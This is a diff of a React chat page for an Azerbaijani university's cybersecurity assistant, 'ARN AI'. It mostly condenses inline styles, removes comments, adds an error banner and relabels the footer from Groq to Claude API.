               <span style={{ width: 5, height: 5, borderRadius: '50%', background: '#4ade80', boxShadow: '0 0 6px #4ade80', display: 'inline-block', animation: 'statusBlink 1.8s ease-in-out infinite' }} />
               <span style={{ fontSize: 7, letterSpacing: 2, color: 'rgba(129,140,248,.6)' }}>ONLINE</span>
             </div>
             <button onClick={e => { e.stopPropagation(); createNewChat() }}
-              style={{
-                background: 'linear-gradient(135deg,rgba(99,102,241,.15),rgba(139,92,246,.1))',
-                border: '1px solid rgba(99,102,241,.35)', color: '#a5b4fc', height: 36, borderRadius: 9,
-                cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6, padding: '0 14px',
-                fontSize: 9, letterSpacing: 2, fontWeight: 700, transition: 'all .25s cubic-bezier(.16,1,.3,1)',
-              }}
-              onMouseEnter={e => { e.currentTarget.style.boxShadow = '0 0 24px rgba(99,102,241,.4)'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.6)'; e.currentTarget.style.transform = 'translateY(-1px)' }}
-              onMouseLeave={e => { e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.borderColor = 'rgba(99,102,241,.35)'; e.currentTarget.style.transform = 'translateY(0)' }}
-            >
+              style={{ background: 'linear-gradient(135deg,rgba(99,102,241,.15),rgba(139,92,246,.1))', border: '1px solid rgba(99,102,241,.35)', color: '#a5b4fc', height: 36, borderRadius: 9, cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 6, padding: '0 14px', fontSize: 9, letterSpacing: 2, fontWeight: 700, transition: 'all .25s cubic-bezier(.16,1,.3,1)' }}
+              onMouseEnter={e => { e.currentTarget.style.boxShadow = '0 0 24px rgba(99,102,241,.4)'; e.currentTarget.style.transform = 'translateY(-1px)' }}
+              onMouseLeave={e => { e.currentTarget.style.boxShadow = 'none'; e.currentTarget.style.transform = 'translateY(0)' }}>
               <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round">
                 <line x1="12" y1="5" x2="12" y2="19" /><line x1="5" y1="12" x2="19" y2="12" />
               </svg>
@@ -950,8 +747,8 @@ export default function ChatPage() {
           </div>
         </div>
 
-        {/* ── Messages ─────────────────────────────────────────────────── */}
-        <div style={{ flex: 1, overflowY: 'auto', padding: '24px 20px', display: 'flex', flexDirection: 'column', gap: 16, position: 'relative' }}>
+        {/* Messages */}
+        <div style={{ flex: 1, overflowY: 'auto', padding: '24px 20px', display: 'flex', flexDirection: 'column', gap: 16 }}>
 
           {/* Empty state */}
           {(!currentChat || currentChat.messages.length === 0) && (
@@ -965,26 +762,21 @@ export default function ChatPage() {
                 <div style={{ fontSize: 28, fontWeight: 700, background: 'linear-gradient(135deg,#818cf8,#c084fc)', backgroundSize: '200% 100%', WebkitBackgroundClip: 'text', WebkitTextFillColor: 'transparent', letterSpacing: 4, animation: 'shimmer 3s linear infinite' }}>ARN AI</div>
                 <div style={{ fontSize: 9, letterSpacing: 3, color: 'rgba(148,163,184,.4)', marginTop: 6 }}>// kibertəhlükəsizlik_assistantı</div>
               </div>
-              <p style={{ maxWidth: 380, lineHeight: 1.8, fontSize: 10, letterSpacing: 1, color: 'rgba(148,163,184,.5)' }}>Penetration testing, etik hacking və kibertəhlükəsizlik haqqında suallarınızı soruşun.</p>
+              <p style={{ maxWidth: 380, lineHeight: 1.8, fontSize: 10, letterSpacing: 1, color: 'rgba(148,163,184,.5)' }}>
+                Penetration testing, etik hacking və kibertəhlükəsizlik haqqında suallarınızı soruşun.
+              </p>
               <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, marginTop: 12, width: '100%', maxWidth: 480 }}>
                 {SUGGESTIONS.map(q => (
                   <button key={q} onClick={e => { e.stopPropagation(); setInput(q) }}
-                    style={{
-                      padding: '12px 14px', borderRadius: 10, cursor: 'pointer',
-                      background: 'rgba(4,4,22,.85)', border: '1px solid rgba(99,102,241,.18)',
-                      color: 'rgba(148,163,184,.55)', fontSize: 9, letterSpacing: 1,
-                      textAlign: 'left', lineHeight: 1.7, backdropFilter: 'blur(10px)',
-                      transition: 'all .3s cubic-bezier(.16,1,.3,1)',
-                    }}
+                    style={{ padding: '12px 14px', borderRadius: 10, cursor: 'pointer', background: 'rgba(4,4,22,.85)', border: '1px solid rgba(99,102,241,.18)', color: 'rgba(148,163,184,.55)', fontSize: 9, letterSpacing: 1, textAlign: 'left', lineHeight: 1.7, backdropFilter: 'blur(10px)', transition: 'all .3s cubic-bezier(.16,1,.3,1)' }}
                     onMouseEnter={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.5)'; e.currentTarget.style.color = '#a5b4fc'; e.currentTarget.style.background = 'rgba(99,102,241,.08)'; e.currentTarget.style.transform = 'translateY(-2px)'; e.currentTarget.style.boxShadow = '0 0 20px rgba(99,102,241,.15)' }}
-                    onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.18)'; e.currentTarget.style.color = 'rgba(148,163,184,.55)'; e.currentTarget.style.background = 'rgba(4,4,22,.85)'; e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none' }}
-                  >
+                    onMouseLeave={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.18)'; e.currentTarget.style.color = 'rgba(148,163,184,.55)'; e.currentTarget.style.background = 'rgba(4,4,22,.85)'; e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.boxShadow = 'none' }}>
                     <span style={{ color: '#818cf8', marginRight: 6, opacity: 0.7 }}>▸</span>{q}
                   </button>
                 ))}
               </div>
               <div style={{ display: 'flex', gap: 24, marginTop: 20, fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,.3)' }}>
-                <span>GROQ API</span><span>·</span><span>NEURAL ENGINE</span><span>·</span><span>v6.0</span>
+                <span>CLAUDE API</span><span>·</span><span>NEURAL ENGINE</span><span>·</span><span>v7.0</span>
               </div>
             </div>
           )}
@@ -997,14 +789,8 @@ export default function ChatPage() {
               justifyContent: message.role === 'user' ? 'flex-end' : 'flex-start',
               alignItems: 'flex-start', maxWidth: '100%',
             }}>
-              {/* AI avatar */}
               {message.role === 'assistant' && (
-                <div style={{
-                  width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2,
-                  background: 'rgba(99,102,241,.1)', border: '1px solid rgba(99,102,241,.35)',
-                  display: 'flex', alignItems: 'center', justifyContent: 'center',
-                  boxShadow: '0 0 14px rgba(99,102,241,.2)', position: 'relative',
-                }}>
+                <div style={{ width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2, background: 'rgba(99,102,241,.1)', border: '1px solid rgba(99,102,241,.35)', display: 'flex', alignItems: 'center', justifyContent: 'center', boxShadow: '0 0 14px rgba(99,102,241,.2)', position: 'relative' }}>
                   {isLoading && idx === (currentChat?.messages.length || 0) - 1 && (
                     <div style={{ position: 'absolute', inset: -3, borderRadius: '50%', border: '1px solid transparent', borderTopColor: '#818cf8', animation: 'spin 2s linear infinite' }} />
                   )}
@@ -1012,7 +798,6 @@ export default function ChatPage() {
                 </div>
               )}
 
-              {/* Message bubble */}
               <div style={{
                 maxWidth: message.role === 'user' ? '72%' : '82%',
                 padding: message.role === 'user' ? '10px 16px' : '12px 16px',
@@ -1028,71 +813,41 @@ export default function ChatPage() {
                   backdropFilter: 'blur(20px)', boxShadow: '0 0 25px rgba(99,102,241,.06)',
                 }),
               }}>
-                {message.role === 'assistant' && (
-                  <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(99,102,241,.35),transparent)' }} />
-                )}
-                {message.role === 'user' && (
-                  <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(139,92,246,.3),transparent)' }} />
-                )}
+                {message.role === 'assistant' && <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(99,102,241,.35),transparent)' }} />}
+                {message.role === 'user' && <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(139,92,246,.3),transparent)' }} />}
                 {message.role === 'assistant'
                   ? (message.content ? <MarkdownMessage content={message.content} /> : <ThinkingDots />)
-                  : message.content
-                }
+                  : message.content}
               </div>
 
-              {/* User avatar */}
               {message.role === 'user' && (
-                <div style={{
-                  width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2,
-                  background: 'linear-gradient(135deg,#6366f1,#9333ea)',
-                  display: 'flex', alignItems: 'center', justifyContent: 'center',
-                  fontWeight: 700, fontSize: 13, color: 'white',
-                  boxShadow: '0 0 14px rgba(99,102,241,.35)',
-                  border: '1px solid rgba(255,255,255,.15)',
-                }}>U</div>
+                <div style={{ width: 34, height: 34, borderRadius: 10, flexShrink: 0, marginTop: 2, background: 'linear-gradient(135deg,#6366f1,#9333ea)', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 13, color: 'white', boxShadow: '0 0 14px rgba(99,102,241,.35)', border: '1px solid rgba(255,255,255,.15)' }}>U</div>
               )}
             </div>
           ))}
-
           <div ref={messagesEndRef} />
         </div>
 
-        {/* ── Input Area ───────────────────────────────────────────────── */}
-        <div style={{
-          padding: '12px 20px 18px', borderTop: '1px solid rgba(99,102,241,.1)',
-          background: 'rgba(1,1,12,.9)', backdropFilter: 'blur(30px)', position: 'relative',
-        }}>
+        {/* Input Area */}
+        <div style={{ padding: '12px 20px 18px', borderTop: '1px solid rgba(99,102,241,.1)', background: 'rgba(1,1,12,.9)', backdropFilter: 'blur(30px)', position: 'relative' }}>
           <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(99,102,241,.15),transparent)' }} />
 
-          {/* Token bar */}
+          {error && <ErrorBanner msg={error} onDismiss={() => setError(null)} />}
+
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: 10, padding: '0 2px' }}>
             <span style={{ fontSize: 8, letterSpacing: 2, color: 'rgba(129,140,248,.35)' }}>// messages: {tokenUsed}/{tokenLimit}</span>
             <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
               <div style={{ width: 80, height: 2, borderRadius: 2, background: 'rgba(255,255,255,.05)', overflow: 'hidden' }}>
-                <div style={{
-                  height: '100%', borderRadius: 2, width: `${tokenPct}%`,
-                  background: tokenPct > 80 ? 'linear-gradient(90deg,#f59e0b,#ef4444)' : 'linear-gradient(90deg,#6366f1,#9333ea)',
-                  transition: 'width .5s',
-                  boxShadow: tokenPct > 80 ? '0 0 6px rgba(239,68,68,.5)' : '0 0 6px rgba(99,102,241,.5)',
-                }} />
+                <div style={{ height: '100%', borderRadius: 2, width: `${tokenPct}%`, background: tokenPct > 80 ? 'linear-gradient(90deg,#f59e0b,#ef4444)' : 'linear-gradient(90deg,#6366f1,#9333ea)', transition: 'width .5s', boxShadow: tokenPct > 80 ? '0 0 6px rgba(239,68,68,.5)' : '0 0 6px rgba(99,102,241,.5)' }} />
               </div>
               <span style={{ fontSize: 7, letterSpacing: 2, color: tokenPct > 80 ? 'rgba(239,68,68,.5)' : 'rgba(99,102,241,.3)' }}>{Math.round(tokenPct)}%</span>
             </div>
           </div>
 
-          {/* Input box */}
-          <div style={{
-            display: 'flex', gap: 10, alignItems: 'flex-end', padding: '10px 14px', borderRadius: 14,
-            background: 'rgba(4,4,22,.9)', border: '1px solid rgba(99,102,241,.22)',
-            transition: 'all .3s cubic-bezier(.16,1,.3,1)', position: 'relative', overflow: 'hidden',
-            boxShadow: '0 0 20px rgba(99,102,241,.05)',
-          }}
+          <div style={{ display: 'flex', gap: 10, alignItems: 'flex-end', padding: '10px 14px', borderRadius: 14, background: 'rgba(4,4,22,.9)', border: '1px solid rgba(99,102,241,.22)', transition: 'all .3s cubic-bezier(.16,1,.3,1)', position: 'relative', overflow: 'hidden', boxShadow: '0 0 20px rgba(99,102,241,.05)' }}
             onFocusCapture={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.5)'; e.currentTarget.style.boxShadow = '0 0 30px rgba(99,102,241,.12),inset 0 0 30px rgba(99,102,241,.03)' }}
-            onBlurCapture={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.22)'; e.currentTarget.style.boxShadow = '0 0 20px rgba(99,102,241,.05)' }}
-          >
+            onBlurCapture={e => { e.currentTarget.style.borderColor = 'rgba(99,102,241,.22)'; e.currentTarget.style.boxShadow = '0 0 20px rgba(99,102,241,.05)' }}>
             <div style={{ position: 'absolute', bottom: 0, left: 0, right: 0, height: 1, background: 'linear-gradient(90deg,transparent,rgba(99,102,241,.25),transparent)', animation: 'scanH 3s linear infinite', pointerEvents: 'none' }} />
-
-            {/* Corner decorations */}
             <div style={{ position: 'absolute', top: 5, left: 5, width: 6, height: 6, borderLeft: '1px solid rgba(99,102,241,.2)', borderTop: '1px solid rgba(99,102,241,.2)', pointerEvents: 'none' }} />
             <div style={{ position: 'absolute', top: 5, right: 5, width: 6, height: 6, borderRight: '1px solid rgba(99,102,241,.2)', borderTop: '1px solid rgba(99,102,241,.2)', pointerEvents: 'none' }} />
             <div style={{ position: 'absolute', bottom: 5, left: 5, width: 6, height: 6, borderLeft: '1px solid rgba(99,102,241,.2)', borderBottom: '1px solid rgba(99,102,241,.2)', pointerEvents: 'none' }} />
@@ -1105,32 +860,15 @@ export default function ChatPage() {
               onKeyDown={handleKeyDown}
               onClick={e => e.stopPropagation()}
               placeholder="// sualınızı yazın...  (Enter → göndər)"
-              style={{
-                flex: 1, background: 'transparent', border: 'none', outline: 'none',
-                resize: 'none', color: '#e2e8f0',
-                fontFamily: "'Space Mono', monospace", fontSize: '0.88rem',
-                lineHeight: 1.6, minHeight: 22, maxHeight: 128, caretColor: '#818cf8',
-              }}
+              style={{ flex: 1, background: 'transparent', border: 'none', outline: 'none', resize: 'none', color: '#e2e8f0', fontFamily: "'Space Mono', monospace", fontSize: '0.88rem', lineHeight: 1.6, minHeight: 22, maxHeight: 128, caretColor: '#818cf8' }}
               rows={1}
             />
 
             <button onClick={e => { e.stopPropagation(); handleSend() }}
               disabled={isLoading || !input.trim()}
-              style={{
-                flexShrink: 0, width: 38, height: 38, borderRadius: 10,
-                display: 'flex', alignItems: 'center', justifyContent: 'center',
-                cursor: isLoading || !input.trim() ? 'not-allowed' : 'pointer',
-                transition: 'all .3s cubic-bezier(.16,1,.3,1)', border: 'none', position: 'relative',
-                ...(isLoading || !input.trim() ? {
-                  background: 'rgba(99,102,241,.06)', color: 'rgba(99,102,241,.25)',
-                } : {
-                  background: 'linear-gradient(135deg,#6366f1,#9333ea)', color: 'white',
-                  boxShadow: '0 0 22px rgba(99,102,241,.4)',
-                }),
-              }}
+              style={{ flexShrink: 0, width: 38, height: 38, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center', cursor: isLoading || !input.trim() ? 'not-allowed' : 'pointer', transition: 'all .3s cubic-bezier(.16,1,.3,1)', border: 'none', position: 'relative', ...(isLoading || !input.trim() ? { background: 'rgba(99,102,241,.06)', color: 'rgba(99,102,241,.25)' } : { background: 'linear-gradient(135deg,#6366f1,#9333ea)', color: 'white', boxShadow: '0 0 22px rgba(99,102,241,.4)' }) }}
               onMouseEnter={e => { if (!isLoading && input.trim()) { e.currentTarget.style.transform = 'translateY(-2px) scale(1.05)'; e.currentTarget.style.boxShadow = '0 0 35px rgba(99,102,241,.6)' } }}
-              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0) scale(1)'; e.currentTarget.style.boxShadow = isLoading || !input.trim() ? 'none' : '0 0 22px rgba(99,102,241,.4)' }}
-            >
+              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0) scale(1)'; e.currentTarget.style.boxShadow = isLoading || !input.trim() ? 'none' : '0 0 22px rgba(99,102,241,.4)' }}>
               {isLoading ? (
                 <svg style={{ animation: 'spin 1s linear infinite', width: 15, height: 15 }} viewBox="0 0 24 24" fill="none">
                   <circle cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="3" strokeDasharray="31.4" strokeDashoffset="10" strokeLinecap="round" />
@@ -1143,16 +881,13 @@ export default function ChatPage() {
             </button>
           </div>
 
-          {/* Footer */}
           <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 16, marginTop: 8, fontSize: 7, letterSpacing: 2, color: 'rgba(148,163,184,.18)' }}>
             <span>AZTU</span><span style={{ color: 'rgba(99,102,241,.2)' }}>·</span><span>CYBERSEC DEPT</span><span style={{ color: 'rgba(99,102,241,.2)' }}>·</span><span>REDBOARD v1.0</span>
           </div>
         </div>
       </div>
 
-      {/* ══════════════════════════════════════════════════════════════════
-          HUD OVERLAYS
-      ══════════════════════════════════════════════════════════════════ */}
+      {/* HUD Overlays */}
       <div style={{ position: 'absolute', bottom: 12, left: 12, zIndex: 3, fontSize: 7, letterSpacing: 2, color: 'rgba(99,102,241,.2)', lineHeight: 2, pointerEvents: 'none' }}>
         <div>NEURAL.CORE ▸ ONLINE</div>
         <div>LATENCY ▸ &lt;12ms</div>
